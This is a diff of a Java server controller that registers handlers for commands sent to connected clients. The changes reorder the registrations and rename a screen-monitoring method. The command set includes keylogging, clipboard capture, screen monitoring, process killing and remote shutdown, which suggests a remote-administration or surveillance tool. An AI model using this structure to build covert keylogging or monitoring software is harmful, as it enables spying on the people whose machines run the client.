@@ -18,17 +18,17 @@ public class Controller {
     private static final String PROPERTY_CLIENTS = "clients";
 
     public static void init() {
-        put(COMMAND_NOTIFICATION, Controller::notify);
-        put(COMMAND_SHUTDOWN_CLIENT, Controller::shutdown);
-        put(COMMAND_CLIENT_MONITOR, Controller::getScreen);
-        put(COMMAND_GET_CLIENTS, Controller::getAllClients);
-        put(COMMAND_CLIENT_PROCESS, Controller::getProcess);
+        put(COMMAND_CLIENT_SYSTEM_USAGE, Controller::getClientSystemUsage);
+        put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
         put(COMMAND_GET_HOST_PRIVILEGE, Controller::getHostPrivilege);
+        put(COMMAND_CLIENT_MONITOR, Controller::getClientMonitor);
         put(COMMAND_END_CLIENT_PROCESS, Controller::endProcess);
         put(COMMAND_CLIENT_KEYLOGGER, Controller::getKeylogger);
         put(COMMAND_CLIENT_CLIPBOARD, Controller::getClipboard);
-        put(COMMAND_CLIENT_SYSTEM_USAGE, Controller::getClientSystemUsage);
-        put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
+        put(COMMAND_GET_CLIENTS, Controller::getAllClients);
+        put(COMMAND_CLIENT_PROCESS, Controller::getProcess);
+        put(COMMAND_SHUTDOWN_CLIENT, Controller::shutdown);
+        put(COMMAND_NOTIFICATION, Controller::notify);
     }
 
     private static void shutdown(JSON json, SocketModel sender) {
@@ -51,7 +51,7 @@ public class Controller {
         Server.getHost().onSend(json.toString());
     }
 
-    private static void getScreen(JSON json, SocketModel sender) {
+    private static void getClientMonitor(JSON json, SocketModel sender) {
         if (isHost(sender.getUUID())) {
             onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_CLIENT_MONITOR).json());
             return;
